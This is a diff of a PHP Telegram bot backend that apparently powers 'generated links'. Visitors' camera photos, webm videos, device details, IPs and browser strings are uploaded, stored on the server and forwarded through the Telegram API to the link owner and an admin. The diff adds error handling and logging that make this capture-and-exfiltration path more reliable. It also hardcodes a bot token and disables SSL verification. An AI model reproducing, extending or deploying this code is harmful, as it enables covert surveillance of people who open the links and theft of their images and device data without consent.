@@ -1,33 +1,33 @@
 <?php
 // Bot Token and Admin Chat ID
 define('BOT_TOKEN', '7610372593:AAEhxeF21e1wlhrr_GVWcGYHOGre8tib5-I');
-define('ADMIN_CHAT_ID', '7825600665'); // <<--- هام: استبدل هذا بمعرف الدردشة الخاص بك كمسؤول
+define('ADMIN_CHAT_ID', '7825600665');
 define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
 
 // Pagination Settings
 define('ITEMS_PER_PAGE', 10);
-define('MAX_MESSAGE_LENGTH', 4000); // Telegram's character limit is 4096, we use a bit less for safety.
+define('MAX_MESSAGE_LENGTH', 4000);
 
 // File and Directory Paths
 define('ALLOWED_USERS_FILE', 'allowed_users.json');
-define('BANNED_USERS_FILE', 'banned_users.json'); // New file for banned users
+define('BANNED_USERS_FILE', 'banned_users.json');
 define('USER_STATES_DIR', 'user_states/');
 define('GENERATED_LINKS_DIR', 'generated_links/');
 define('MAINTENANCE_FILE', 'maintenance_mode.json');
-define('PAGINATION_TEMP_DIR', 'temp_messages/'); // New directory for temporary pagination data
+define('PAGINATION_TEMP_DIR', 'temp_messages/');
 
-// Default thumbnail URL if no OG image is found. REPLACE THIS WITH YOUR OWN URL!
-define('DEFAULT_THUMBNAIL_URL', 'https://your-domain.com/default_thumbnail.jpg'); // <<-- هام: استبدل هذا برابط صورة مصغرة افتراضية حقيقية
+// Default thumbnail URL
+define('DEFAULT_THUMBNAIL_URL', 'https://your-domain.com/default_thumbnail.jpg');
 
-// Ensure directories exist
-if (!is_dir(USER_STATES_DIR)) {
-    mkdir(USER_STATES_DIR, 0777, true);
-}
-if (!is_dir(GENERATED_LINKS_DIR)) {
-    mkdir(GENERATED_LINKS_DIR, 0777, true);
-}
-if (!is_dir(PAGINATION_TEMP_DIR)) {
-    mkdir(PAGINATION_TEMP_DIR, 0777, true);
+// Ensure directories exist with proper permissions
+$dirs = [USER_STATES_DIR, GENERATED_LINKS_DIR, PAGINATION_TEMP_DIR];
+foreach ($dirs as $dir) {
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    if (!is_writable($dir)) {
+        chmod($dir, 0755);
+    }
 }
 
 // --- CORS Headers for JavaScript requests ---
@@ -39,12 +39,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit();
 }
 
+// --- DEBUG MODE (set to false in production) ---
+$debug_mode = true;
+if ($debug_mode) {
+    error_reporting(E_ALL);
+    ini_set('display_errors', 0);
+    ini_set('log_errors', 1);
+    ini_set('error_log', 'php_errors.log');
+}
+
+// --- Determine the correct script URL for media uploads ---
+function getScriptUrl() {
+    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    $script = $_SERVER['SCRIPT_NAME']; // This gives the correct path to this PHP file
+    return $protocol . '://' . $host . $script;
+}
+
 // --- Helper Functions ---
 
-/**
- * Loads allowed users from the JSON file.
- * @return array
- */
 function loadAllowedUsers() {
     if (!file_exists(ALLOWED_USERS_FILE)) {
         return [];
@@ -53,18 +66,10 @@ function loadAllowedUsers() {
     return is_array($users) ? $users : [];
 }
 
-/**
- * Saves allowed users to the JSON file.
- * @param array $users
- */
 function saveAllowedUsers($users) {
     file_put_contents(ALLOWED_USERS_FILE, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
 }
 
-/**
- * Loads banned users from the JSON file.
- * @return array
- */
 function loadBannedUsers() {
     if (!file_exists(BANNED_USERS_FILE)) {
         return [];
@@ -73,45 +78,23 @@ function loadBannedUsers() {
     return is_array($users) ? $users : [];
 }
 
-/**
- * Saves banned users to the JSON file.
- * @param array $users
- */
 function saveBannedUsers($users) {
     file_put_contents(BANNED_USERS_FILE, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
 }
 
-/**
- * Checks if a user is currently banned.
- * @param int $chat_id
- * @return bool
- */
 function isUserBanned($chat_id) {
     $banned_users = loadBannedUsers();
     return isset($banned_users[$chat_id]);
 }
 
-/**
- * Checks if a user exists in the allowed list.
- * @param int $chat_id
- * @return bool
- */
 function userExistsInAllowedList($chat_id) {
     $users = loadAllowedUsers();
     return isset($users[$chat_id]);
 }
 
-/**
- * Adds or updates a user in the allowed list.
- * This function should only be called AFTER checking if the user is banned.
- * @param int $chat_id
- * @param string $first_name
- * @param string|null $username
- * @return bool
- */
 function addOrUpdateUser($chat_id, $first_name = 'Unknown', $username = null) {
     if (isUserBanned($chat_id)) {
-        return false; // Cannot add/update a banned user to allowed list
+        return false;
     }
     $users = loadAllowedUsers();
     $users[$chat_id] = [
@@ -123,11 +106,6 @@ function addOrUpdateUser($chat_id, $first_name = 'Unknown', $username = null) {
     return true;
 }
 
-/**
- * Bans a user: removes from allowed, adds to banned.
- * @param int $chat_id
- * @return bool
- */
 function banUser($chat_id) {
     $allowed_users = loadAllowedUsers();
     $banned_users = loadBannedUsers();
@@ -139,10 +117,8 @@ function banUser($chat_id) {
         unset($allowed_users[$chat_id]);
         saveAllowedUsers($allowed_users);
     } elseif (isset($banned_users[$chat_id])) {
-        // User is already banned, no change needed.
-        return false; 
+        return false;
     } else {
-        // User not in allowed, not in banned. Add minimal info to banned.
         $user_data_to_ban = [
             'first_name' => 'Unknown',
             'username' => null,
@@ -156,11 +132,6 @@ function banUser($chat_id) {
     return true;
 }
 
-/**
- * Unbans a user: removes from banned, adds to allowed.
- * @param int $chat_id
- * @return bool
- */
 function unbanUser($chat_id) {
     $banned_users = loadBannedUsers();
     if (isset($banned_users[$chat_id])) {
@@ -168,17 +139,12 @@ function unbanUser($chat_id) {
         unset($banned_users[$chat_id]);
         saveBannedUsers($banned_users);
 
-        // Add back to allowed users list
         addOrUpdateUser($chat_id, $user_data_to_unban['first_name'] ?? 'Unknown', $user_data_to_unban['username'] ?? null);
         return true;
     }
-    return false; // User was not banned
+    return false;
 }
 
-/**
- * Gets all registered bot users (both allowed and banned, for admin overview).
- * @return array { 'allowed': [...], 'banned': [...] }
- */
 function getAllBotUsers() {
     return [
         'allowed' => loadAllowedUsers(),
@@ -186,30 +152,14 @@ function getAllBotUsers() {
     ];
 }
 
-
-/**
- * Generates the file path for user-specific state data.
- * @param int $chat_id
- * @param string $type
- * @return string
- */
 function getUserStateFile($chat_id, $type) {
     return USER_STATES_DIR . "user_{$type}_" . $chat_id . '.txt';
 }
 
-/**
- * Checks if a chat ID belongs to the admin.
- * @param int $chat_id
- * @return bool
- */
 function isAdmin($chat_id) {
     return (string)$chat_id === (string)ADMIN_CHAT_ID;
 }
 
-/**
- * Loads maintenance mode status.
- * @return bool
- */
 function isMaintenanceMode() {
     if (!file_exists(MAINTENANCE_FILE)) {
         return false;
@@ -218,31 +168,19 @@ function isMaintenanceMode() {
     return $status['active'] ?? false;
 }
 
-/**
- * Toggles maintenance mode.
- * @param bool $status
- */
 function setMaintenanceMode($status) {
     file_put_contents(MAINTENANCE_FILE, json_encode(['active' => $status], JSON_PRETTY_PRINT));
 }
 
-/**
- * Sends a message to Telegram using cURL with JSON payload.
- * @param int $chat_id
- * @param string $text
- * @param string|null $reply_markup (JSON string)
- * @param string $parse_mode
- * @return array
- */
 function sendMessage($chat_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
     $data = [
         'chat_id' => $chat_id,
         'text' => $text,
         'parse_mode' => $parse_mode,
-        'disable_web_page_preview' => true // Usually good for code/links
+        'disable_web_page_preview' => true
     ];
     if ($reply_markup) {
-        $data['reply_markup'] = json_decode($reply_markup, true); // Decode JSON string to associative array
+        $data['reply_markup'] = json_decode($reply_markup, true);
     }
 
     $ch = curl_init();
@@ -257,25 +195,16 @@ function sendMessage($chat_id, $text, $reply_markup = null, $parse_mode = 'HTML'
     return ['response' => $response, 'http_code' => $http_code];
 }
 
-/**
- * Edits an existing message in Telegram using cURL with JSON payload.
- * @param int $chat_id
- * @param int $message_id
- * @param string $text
- * @param string|null $reply_markup (JSON string)
- * @param string $parse_mode
- * @return array
- */
 function editMessage($chat_id, $message_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
     $data = [
         'chat_id' => $chat_id,
         'message_id' => $message_id,
         'text' => $text,
         'parse_mode' => $parse_mode,
-        'disable_web_page_preview' => true // Usually good for code/links
+        'disable_web_page_preview' => true
     ];
     if ($reply_markup) {
-        $data['reply_markup'] = json_decode($reply_markup, true); // Decode JSON string to associative array
+        $data['reply_markup'] = json_decode($reply_markup, true);
     }
 
     $ch = curl_init();
@@ -290,15 +219,9 @@ function editMessage($chat_id, $message_id, $text, $reply_markup = null, $parse_
     return ['response' => $response, 'http_code' => $http_code];
 }
 
-/**
- * Sends a video file to Telegram using cURL.
- * @param int $target_chat_id
- * @param string $video_file_path
- * @param string|null $caption
- * @return array
- */
 function sendVideoToTelegram($target_chat_id, $video_file_path, $caption = null) {
     if (!file_exists($video_file_path)) {
+        error_log("Video file not found: " . $video_file_path);
         return ['status' => 'error', 'message' => 'Video file not found.'];
     }
     $post_data = [
@@ -320,19 +243,14 @@ function sendVideoToTelegram($target_chat_id, $video_file_path, $caption = null)
     if ($http_code == 200) {
         return ['status' => 'success', 'message' => 'Video sent successfully.'];
     } else {
+        error_log("Failed to send video. HTTP: {$http_code}, Response: {$response}");
         return ['status' => 'error', 'message' => 'Failed to send video.', 'response' => $response, 'http_code' => $http_code];
     }
 }
 
-/**
- * Sends a photo file to Telegram using cURL.
- * @param int $target_chat_id
- * @param string $photo_file_path
- * @param string|null $caption
- * @return array
- */
 function sendPhotoToTelegram($target_chat_id, $photo_file_path, $caption = null) {
     if (!file_exists($photo_file_path)) {
+        error_log("Photo file not found: " . $photo_file_path);
         return ['status' => 'error', 'message' => 'Photo file not found.'];
     }
     $post_data = [
@@ -354,32 +272,28 @@ function sendPhotoToTelegram($target_chat_id, $photo_file_path, $caption = null)
     if ($http_code == 200) {
         return ['status' => 'success', 'message' => 'Photo sent successfully.'];
     } else {
+        error_log("Failed to send photo. HTTP: {$http_code}, Response: {$response}");
         return ['status' => 'error', 'message' => 'Failed to send photo.', 'response' => $response, 'http_code' => $http_code];
     }
 }
 
-/**
- * Fetches Open Graph (OG) meta tags from a given URL.
- * @param string $url The URL to fetch.
- * @return array An associative array of OG tags, or empty array if not found/failed.
- */
 function fetchOgMetaTags($url) {
     $og_data = [
         'og:title' => null,
         'og:description' => null,
         'og:image' => null,
-        'og:url' => $url, // Default to the original URL
-        'og:type' => 'website' // Default type
+        'og:url' => $url,
+        'og:type' => 'website'
     ];
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
-    curl_setopt($ch, CURLOPT_MAXREDIRS, 5); // Max redirects
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout after 10 seconds
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'); // Mimic Googlebot
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For development, consider true in production
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
     $html = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -387,18 +301,16 @@ function fetchOgMetaTags($url) {
     curl_close($ch);
 
     if ($http_code !== 200 || $html === false || !empty($error)) {
-        // Log error if needed: error_log("Failed to fetch OG tags for {$url}: HTTP {$http_code}, Error: {$error}");
-        return $og_data; // Return default or partially filled data
+        return $og_data;
     }
 
-    // Use DOMDocument to parse HTML and extract meta tags
-    libxml_use_internal_errors(true); // Suppress HTML5 parsing errors
+    libxml_use_internal_errors(true);
     $doc = new DOMDocument();
     $doc->loadHTML($html);
     libxml_clear_errors();
 
     $xpath = new DOMXPath($doc);
-    $query = '//meta[starts-with(@property, "og:")] | //meta[starts-with(@name, "twitter:")] | //title'; // Also capture twitter cards and title
+    $query = '//meta[starts-with(@property, "og:")] | //meta[starts-with(@name, "twitter:")] | //title';
 
     $metas = $xpath->query($query);
 
@@ -414,16 +326,13 @@ function fetchOgMetaTags($url) {
             $og_data['og:image'] = $content;
         } elseif ($property === 'og:type' && !empty($content)) {
             $og_data['og:type'] = $content;
-        }
-        // Prioritize OG URL, if not found, use Twitter URL, else fallback to original
-        elseif ($property === 'og:url' && !empty($content)) {
+        } elseif ($property === 'og:url' && !empty($content)) {
             $og_data['og:url'] = $content;
         } elseif ($property === 'twitter:url' && empty($og_data['og:url']) && !empty($content)) {
-             $og_data['og:url'] = $content;
+            $og_data['og:url'] = $content;
         }
     }
 
-    // Fallback for title if no og:title is found
     if (empty($og_data['og:title'])) {
         $titleNode = $xpath->query('//title')->item(0);
         if ($titleNode) {
@@ -431,7 +340,6 @@ function fetchOgMetaTags($url) {
         }
     }
     
-    // Fallback for description if no og:description is found
     if (empty($og_data['og:description'])) {
         $descriptionNode = $xpath->query('//meta[@name="description"]')->item(0);
         if ($descriptionNode) {
@@ -448,24 +356,40 @@ function fetchOgMetaTags($url) {
 $update = json_decode(file_get_contents('php://input'), true);
 
 // --- Handle Media/Device Info Uploads from Generated Links ---
-// These blocks handle data sent from the generated HTML pages (JavaScript)
-// The `ownerChatId` in JS refers to the owner, so we receive it here.
-// The `original_url` and `ownerUsername` are also passed.
+if (isset($_FILES['video']) || isset($_FILES['photo'])) {
+    $debug_log = [
+        'time' => date('Y-m-d H:i:s'),
+        'post_keys' => array_keys($_POST),
+        'files_keys' => array_keys($_FILES),
+        'content_type' => $_SERVER['CONTENT_TYPE'] ?? 'not set',
+        'request_method' => $_SERVER['REQUEST_METHOD']
+    ];
+    file_put_contents('debug_upload.log', json_encode($debug_log, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n\n", FILE_APPEND);
+}
 
 if (isset($_FILES['video'])) {
     $video_file_tmp = $_FILES['video']['tmp_name'];
+    $video_error = $_FILES['video']['error'] ?? 0;
     $owner_chat_id = $_POST['ownerChatId'] ?? null;
     $owner_username_for_display = $_POST['ownerUsername'] ?? 'Unknown User';
     $original_url = $_POST['original_url'] ?? 'N/A';
     $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash'; // New: Get the hash of the generated link
+    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash';
+
+    if ($video_error !== UPLOAD_ERR_OK) {
+        error_log("Video upload error code: " . $video_error);
+        echo json_encode(['status' => 'error', 'message' => 'Upload error code: ' . $video_error]);
+        exit;
+    }
 
     if (is_uploaded_file($video_file_tmp) && $owner_chat_id) {
-        // Save video with link hash in filename
         $unique_filename = "video_{$generated_link_hash}_" . uniqid() . '.webm';
-        $target_upload_path = GENERATED_LINKS_DIR . $unique_filename; // Save temporarily on server
+        $target_upload_path = GENERATED_LINKS_DIR . $unique_filename;
+        
         if (move_uploaded_file($video_file_tmp, $target_upload_path)) {
+            chmod($target_upload_path, 0644);
+            
             $caption = "🎥 **تم التقاط فيديو جديد!**\n\n" .
                        "<b>مالك الرابط:</b> " . htmlspecialchars($owner_username_for_display) . " (<code>{$owner_chat_id}</code>)\n" .
                        "<b>الرابط الأصلي:</b> <a href=\"" . htmlspecialchars($original_url) . "\">" . htmlspecialchars($original_url) . "</a>\n" .
@@ -473,37 +397,48 @@ if (isset($_FILES['video'])) {
                        "<b>المتصفح:</b> " . htmlspecialchars($user_agent);
 
             // Send to Admin
-            sendVideoToTelegram(ADMIN_CHAT_ID, $target_upload_path, $caption);
+            $result_admin = sendVideoToTelegram(ADMIN_CHAT_ID, $target_upload_path, $caption);
+            error_log("Send video to admin result: " . json_encode($result_admin));
+            
             // Send to Owner (if not admin and not banned)
             if ((string)$owner_chat_id !== (string)ADMIN_CHAT_ID && !isUserBanned($owner_chat_id)) {
-                sendVideoToTelegram($owner_chat_id, $target_upload_path, $caption);
+                $result_owner = sendVideoToTelegram($owner_chat_id, $target_upload_path, $caption);
+                error_log("Send video to owner result: " . json_encode($result_owner));
             }
-
-            // unlink($target_upload_path); // Do not delete immediately if admin wants to view
-            // The admin panel will just link to these files, so they need to persist.
 
             echo json_encode(['status' => 'success', 'message' => 'Video sent to Telegram successfully.', 'redirect_url' => $original_url]);
         } else {
+            error_log("Failed to move uploaded video file from {$video_file_tmp} to {$target_upload_path}");
             echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded video file.']);
         }
     } else {
+        error_log("Video upload failed: is_uploaded_file=" . (is_uploaded_file($video_file_tmp) ? 'true' : 'false') . ", owner_chat_id=" . ($owner_chat_id ?? 'null'));
         echo json_encode(['status' => 'error', 'message' => 'Failed to upload video file or owner_chat_id missing.']);
     }
     exit;
 } elseif (isset($_FILES['photo'])) {
     $photo_file_tmp = $_FILES['photo']['tmp_name'];
+    $photo_error = $_FILES['photo']['error'] ?? 0;
     $owner_chat_id = $_POST['ownerChatId'] ?? null;
     $owner_username_for_display = $_POST['ownerUsername'] ?? 'Unknown User';
     $original_url = $_POST['original_url'] ?? 'N/A';
     $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash'; // New: Get the hash of the generated link
+    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash';
+
+    if ($photo_error !== UPLOAD_ERR_OK) {
+        error_log("Photo upload error code: " . $photo_error);
+        echo json_encode(['status' => 'error', 'message' => 'Upload error code: ' . $photo_error]);
+        exit;
+    }
 
     if (is_uploaded_file($photo_file_tmp) && $owner_chat_id) {
-        // Save photo with link hash in filename
         $unique_filename = "photo_{$generated_link_hash}_" . uniqid() . '.jpg';
-        $target_upload_path = GENERATED_LINKS_DIR . $unique_filename; // Save temporarily on server
+        $target_upload_path = GENERATED_LINKS_DIR . $unique_filename;
+        
         if (move_uploaded_file($photo_file_tmp, $target_upload_path)) {
+            chmod($target_upload_path, 0644);
+            
             $caption = "📸 **تم التقاط صورة جديدة!**\n\n" .
                        "<b>مالك الرابط:</b> " . htmlspecialchars($owner_username_for_display) . " (<code>{$owner_chat_id}</code>)\n" .
                        "<b>الرابط الأصلي:</b> <a href=\"" . htmlspecialchars($original_url) . "\">" . htmlspecialchars($original_url) . "</a>\n" .
@@ -511,20 +446,22 @@ if (isset($_FILES['video'])) {
                        "<b>المتصفح:</b> " . htmlspecialchars($user_agent);
 
             // Send to Admin
-            sendPhotoToTelegram(ADMIN_CHAT_ID, $target_upload_path, $caption);
+            $result_admin = sendPhotoToTelegram(ADMIN_CHAT_ID, $target_upload_path, $caption);
+            error_log("Send photo to admin result: " . json_encode($result_admin));
+            
             // Send to Owner (if not admin and not banned)
             if ((string)$owner_chat_id !== (string)ADMIN_CHAT_ID && !isUserBanned($owner_chat_id)) {
-                sendPhotoToTelegram($owner_chat_id, $target_upload_path, $caption);
+                $result_owner = sendPhotoToTelegram($owner_chat_id, $target_upload_path, $caption);
+                error_log("Send photo to owner result: " . json_encode($result_owner));
             }
-
-            // unlink($target_upload_path); // Do not delete immediately if admin wants to view
-            // The admin panel will just link to these files, so they need to persist.
 
             echo json_encode(['status' => 'success', 'message' => 'Photo sent to Telegram successfully.', 'redirect_url' => $original_url]);
         } else {
+            error_log("Failed to move uploaded photo file from {$photo_file_tmp} to {$target_upload_path}");
             echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded photo file.']);
         }
     } else {
+        error_log("Photo upload failed: is_uploaded_file=" . (is_uploaded_file($photo_file_tmp) ? 'true' : 'false') . ", owner_chat_id=" . ($owner_chat_id ?? 'null'));
         echo json_encode(['status' => 'error', 'message' => 'Failed to upload photo file or owner_chat_id missing.']);
     }
     exit;
@@ -536,7 +473,7 @@ if (isset($_FILES['video'])) {
     $original_url = $_POST['original_url'] ?? 'N/A';
     $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash'; // New: Get the hash of the generated link
+    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash';
 
     if ($owner_chat_id && $device_info) {
         $message_text = "✨ **معلومات الجهاز الجديدة!**\n\n";
@@ -549,12 +486,9 @@ if (isset($_FILES['video'])) {
         $message_text .= "<b>الرابط الأصلي:</b> <a href=\"" . htmlspecialchars($original_url) . "\">" . htmlspecialchars($original_url) . "</a>\n";
         $message_text .= "<b>IP الزائر:</b> <code>{$ip_address}</code>\n";
         $message_text .= "<b>المتصفح (الكامل):</b> " . htmlspecialchars($user_agent) . "\n";
-        $message_text .= "<b>هاش الرابط:</b> <code>{$generated_link_hash}</code>"; // Include link hash for tracking
+        $message_text .= "<b>هاش الرابط:</b> <code>{$generated_link_hash}</code>";
 
-
-        // Send to Admin
         sendMessage(ADMIN_CHAT_ID, $message_text);
-        // Send to Owner (if not admin and not banned)
         if ((string)$owner_chat_id !== (string)ADMIN_CHAT_ID && !isUserBanned($owner_chat_id)) {
             sendMessage($owner_chat_id, $message_text);
         }
@@ -567,47 +501,39 @@ if (isset($_FILES['video'])) {
 }
 
 // --- Handle Telegram Bot Updates ---
-
 if (isset($update['message'])) {
     $message = $update['message'];
     $chat_id = $message['chat']['id'];
-    $text = $message['text'];
+    $text = $message['text'] ?? '';
     $message_id = $message['message_id'];
     $user_first_name = $message['from']['first_name'] ?? 'Unknown';
     $user_username = $message['from']['username'] ?? null;
     
-    // --- 1. Check if user is banned (HIGHEST PRIORITY) ---
     if (isUserBanned($chat_id)) {
         sendMessage($chat_id, "⛔ عذراً، لقد تم حظرك من استخدام هذا البوت.");
         exit;
     }
 
-    // --- 2. Add or update user data (if not banned) ---
     if (!userExistsInAllowedList($chat_id)) {
         addOrUpdateUser($chat_id, $user_first_name, $user_username);
-        // Notify admin about new user
-        if (!isAdmin($chat_id)) { // Don't notify admin about themselves
+        if (!isAdmin($chat_id)) {
             sendMessage(ADMIN_CHAT_ID, "🔔 **مستخدم جديد انضم للبوت!**\n" .
                 "<b>ID:</b> <code>{$chat_id}</code>\n" .
                 "<b>الاسم:</b> " . htmlspecialchars($user_first_name) . "\n" .
                 "<b>اليوزر:</b> " . ($user_username ? "@" . htmlspecialchars($user_username) : "غير متاح") . "\n" .
                 "<b>الوقت:</b> " . date('Y-m-d H:i:s'), 
-                json_encode(['inline_keyboard' => [[['text' => '✉️ إرسال رسالة', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]
-                ]]), 'HTML'
+                json_encode(['inline_keyboard' => [[['text' => '✉️ إرسال رسالة', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]]]), 'HTML'
             );
         }
     } else {
-        // Just update last seen for existing allowed user
         addOrUpdateUser($chat_id, $user_first_name, $user_username);
     }
 
-    // --- 3. Handle Admin Commands ---
     if (isAdmin($chat_id)) {
         if ($text === '/admin') {
             showAdminPanel($chat_id);
             exit;
         }
-        // Handle admin-specific states for user management
         $admin_state_file = getUserStateFile($chat_id, 'admin_state');
         $admin_state_data = @file_get_contents($admin_state_file);
         $admin_state_parts = explode(':', $admin_state_data);
@@ -620,29 +546,29 @@ if (isset($update['message'])) {
                     sendMessage($chat_id, "❌ لا يمكنك حظر نفسك يا مسؤول!", null, 'HTML');
                 } elseif (banUser($text)) {
                     sendMessage($chat_id, "✅ تم حظر المستخدم <code>{$text}</code> بنجاح.", null, 'HTML');
-                    sendMessage($text, "⛔ تم حظرك من استخدام هذا البوت بواسطة المسؤول."); // Notify user
+                    sendMessage($text, "⛔ تم حظرك من استخدام هذا البوت بواسطة المسؤول.");
                 } else {
                     sendMessage($chat_id, "⚠️ المستخدم <code>{$text}</code> إما أنه غير موجود أو محظور بالفعل.", null, 'HTML');
                 }
             } else {
                 sendMessage($chat_id, "❌ معرف المستخدم غير صالح. يرجى إرسال رقم الـ ID.", null, 'HTML');
             }
-            @unlink($admin_state_file); // Clear state
-            showAdminPanel($chat_id); // Show admin panel again
+            @unlink($admin_state_file);
+            showAdminPanel($chat_id);
             exit;
         } elseif ($admin_state === 'waiting_for_unban_id') {
             if (is_numeric($text)) {
                 if (unbanUser($text)) {
                     sendMessage($chat_id, "✅ تم إلغاء حظر المستخدم <code>{$text}</code> بنجاح. يمكنه الآن استخدام البوت.", null, 'HTML');
-                    sendMessage($text, "🎉 مرحباً! تم إلغاء حظرك من استخدام البوت. يمكنك الآن استخدام الأوامر."); // Notify user
+                    sendMessage($text, "🎉 مرحباً! تم إلغاء حظرك من استخدام البوت. يمكنك الآن استخدام الأوامر.");
                 } else {
                     sendMessage($chat_id, "⚠️ المستخدم <code>{$text}</code> غير موجود في قائمة المستخدمين المحظورين.", null, 'HTML');
                 }
             } else {
                 sendMessage($chat_id, "❌ معرف المستخدم غير صالح. يرجى إرسال رقم الـ ID.", null, 'HTML');
             }
-            @unlink($admin_state_file); // Clear state
-            showAdminPanel($chat_id); // Show admin panel again
+            @unlink($admin_state_file);
+            showAdminPanel($chat_id);
             exit;
         } elseif ($admin_state === 'waiting_for_broadcast_message') {
             broadcastMessageToAllAllowedUsers($chat_id, $text);
@@ -662,22 +588,20 @@ if (isset($update['message'])) {
             sendMessage($target_chat_id_from_state, "💬 **رسالة من المطور:**\n" . htmlspecialchars($text));
             sendMessage($chat_id, "✅ تم إرسال رسالتك إلى المستخدم <code>{$target_chat_id_from_state}</code> بنجاح.", null, 'HTML');
             @unlink($admin_state_file);
-            showUserDetailsForAdmin($chat_id, $message_id, $target_chat_id_from_state, 'allowed_list_context'); // Go back to user details
+            showUserDetailsForAdmin($chat_id, $message_id, $target_chat_id_from_state, 'allowed_list_context');
             exit;
         } elseif ($admin_state === 'waiting_for_user_search_query') {
             handleAdminUserSearch($chat_id, $text);
-            @unlink($admin_state_file); // Clear state after search
+            @unlink($admin_state_file);
             exit;
         }
     }
 
-    // --- 4. Check maintenance mode for regular users (admin is exempt) ---
     if (isMaintenanceMode() && !isAdmin($chat_id)) {
         sendMessage($chat_id, "⚠️ البوت قيد الصيانة حالياً. يرجى المحاولة لاحقاً.");
         exit;
     }
 
-    // --- 5. Regular user commands ---
     $user_state_file = getUserStateFile($chat_id, "state");
     $user_state_data = @file_get_contents($user_state_file);
     $user_state_parts = explode(':', $user_state_data);
@@ -690,12 +614,11 @@ if (isset($update['message'])) {
                                 "<b>اليوزر:</b> " . ($user_username ? "@" . htmlspecialchars($user_username) : "غير متاح") . "\n\n" .
                                 "<b>الرسالة:</b>\n" . htmlspecialchars($text);
         
-        $keyboard = ['inline_keyboard' => [[['text' => '✉️ الرد على المستخدم', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]
-        ]];
+        $keyboard = ['inline_keyboard' => [[['text' => '✉️ الرد على المستخدم', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]]];
         sendMessage(ADMIN_CHAT_ID, $forward_message_text, json_encode($keyboard), 'HTML');
         sendMessage($chat_id, "✅ تم إرسال رسالتك إلى المطور بنجاح. شكراً لك!");
         @unlink($user_state_file);
-        showStartMessage($chat_id); // Go back to main menu
+        showStartMessage($chat_id);
         exit;
     }
 
@@ -712,29 +635,23 @@ if (isset($update['message'])) {
     $user_first_name = $callback_query['from']['first_name'] ?? 'Unknown';
     $user_username = $callback_query['from']['username'] ?? null;
 
-    // --- 1. Check if user is banned (HIGHEST PRIORITY) ---
     if (isUserBanned($chat_id)) {
         editMessage($chat_id, $message_id, "⛔ عذراً، لقد تم حظرك من استخدام هذا البوت.");
         exit;
     }
 
-    // --- 2. Add or update user data (if not banned) ---
     addOrUpdateUser($chat_id, $user_first_name, $user_username);
 
-    // --- 3. Check maintenance mode for regular users (admin is exempt) ---
     if (isMaintenanceMode() && !isAdmin($chat_id)) {
         editMessage($chat_id, $message_id, "⚠️ البوت قيد الصيانة حالياً. يرجى المحاولة لاحقاً.");
         exit;
     }
 
-    // --- 4. Handle Admin Panel callbacks ---
     if (isAdmin($chat_id)) {
         $parts = explode(':', $data);
         $action = $parts[0];
         $target_chat_id = $parts[1] ?? null;
-        $context = $parts[2] ?? null; // To know if coming from allowed/banned list or specific user action
-        $page = $parts[1] ?? 0;
-        $list_type = $parts[1] ?? 'allowed';
+        $context = $parts[2] ?? null;
 
         if ($action === 'admin_panel') {
             showAdminPanel($chat_id, $message_id);
@@ -775,14 +692,14 @@ if (isset($update['message'])) {
             file_put_contents(getUserStateFile($chat_id, 'admin_state'), "waiting_for_admin_message_to_user:{$target_chat_id}");
             editMessage($chat_id, $message_id, "الرجاء إرسال رسالتك إلى المستخدم <code>{$target_chat_id}</code>:");
             exit;
-        } elseif ($action === 'admin_view_user_links_and_media') { // New handler
+        } elseif ($action === 'admin_view_user_links_and_media') {
             listUserGeneratedLinksAndMedia($chat_id, $message_id, $target_chat_id);
             exit;
-        } elseif ($action === 'admin_ban_user_prompt') { // Old mass ban prompt, keep for consistency or remove if not needed
+        } elseif ($action === 'admin_ban_user_prompt') {
             file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_ban_id');
             editMessage($chat_id, $message_id, "الرجاء إرسال ID المستخدم الذي تريد حظره:");
             exit;
